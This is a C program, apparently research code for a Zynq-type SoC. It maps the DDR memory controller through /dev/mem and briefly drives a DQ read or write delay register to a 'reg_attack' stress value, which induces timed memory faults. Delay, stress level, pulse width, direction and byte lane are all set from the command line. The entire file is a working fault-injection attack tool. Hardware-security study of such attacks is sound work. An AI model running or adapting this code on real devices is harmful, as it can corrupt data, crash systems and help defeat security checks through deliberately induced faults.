#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>  
#include <sys/mman.h>
#include <time.h>
#include <fcntl.h>

#define DDRC_ADDR 0xF8006000

#define rDQ0 0x140
#define rDQ1 0x144
#define rDQ2 0x148
#define rDQ3 0x14c

#define wDQ0 0x154
#define wDQ1 0x158
#define wDQ2 0x15c
#define wDQ3 0x160

void 	nDelay(uint32_t ns);
int 	Map_Registers(int *fd, void **c, int c_addr, int c_size);

volatile uint32_t v_base_addr = 0;

int main(int argc, char **argv){

	struct timespec begin;
	uint32_t iTime;
	uint32_t initdelay;
	uint32_t stress;
	uint32_t width;
	uint32_t direction;
	uint32_t byte;

	if(argc == 6)
	{
	    initdelay = atoi(argv[1]);
	    stress = atoi(argv[2]);
	    width = atoi(argv[3]);
	    direction = atoi(argv[4]);
	    byte = atoi(argv[5]);
	}
	else
	{
		printf("This executable requires 5 arguments, exiting\n\r");
		exit(0);
	}

	int map_file = 0;

	uint32_t reg_attack = (((stress << 11)&0xFF800)| ((1 << 10)&0x400)); //format raw tap units 
	uint32_t reg_r_base = (((26 << 11)&0XFF800) | ((1 << 10)&0x400));
	uint32_t reg_w_base = (((50 << 11)&0XFF800) | ((1 << 10)&0x400));
	(void)argc;

	volatile struct dll_core{
	  volatile uint32_t control;
	} *core_dll;

	//map DLL register
	Map_Registers(&map_file,(void **) &core_dll, DDRC_ADDR, 0x2FF);
	v_base_addr = (uint32_t)(&core_dll->control);

	nDelay(initdelay);

	clock_gettime(CLOCK_MONOTONIC_RAW,&begin);	

	if(direction)
	{
		*(volatile uint32_t*)(v_base_addr + rDQ0 +4*byte) = reg_attack;
		for(iTime = 0 ; iTime < width; iTime++){}
		*(volatile uint32_t*)(v_base_addr + rDQ0 +4*byte) = reg_r_base;
	}
	else
	{
		*(volatile uint32_t*)(v_base_addr + wDQ0 +4*byte) = reg_attack;
		for(iTime = 0 ; iTime < width; iTime++){}
		*(volatile uint32_t*)(v_base_addr + wDQ0 +4*byte) = reg_w_base;	
	}
	
	printf("fault begin: %08.2f us\n\r",(double)(begin.tv_nsec)/1000);
}

int Map_Registers(int *fd, void **c, int c_addr, int c_size)
{

  if ((*fd = open("/dev/mem", O_RDWR | O_SYNC)) == -1) {
  fprintf(stderr, "Error: could not open /dev/mem!\n");
  return -1;
  }

  if ((*c = mmap(NULL, c_size, PROT_READ | PROT_WRITE, MAP_SHARED, *fd, c_addr)) == (void *) -1) {

  fprintf(stderr, "Error: could not map memory to file!\n");
  return -1;
  }

  return 0;
}

void nDelay(uint32_t ns)
{
	struct timespec t;
	clock_gettime(CLOCK_MONOTONIC_RAW,&t);		
	int t1 = 0;
	int t2 = 0;
	int p = 0;
	int st = 0;

  	while(st < ns)
  	{
  		t1 = t.tv_nsec;
  		clock_gettime(CLOCK_MONOTONIC_RAW,&t);
  		t2 = t.tv_nsec;
  		p = t2 - t1;

  		if(p < 0)
  		{
  			st += (p + 1000000000);
  		}
  		else
  		{
  			st += p;
  		}
  	}
}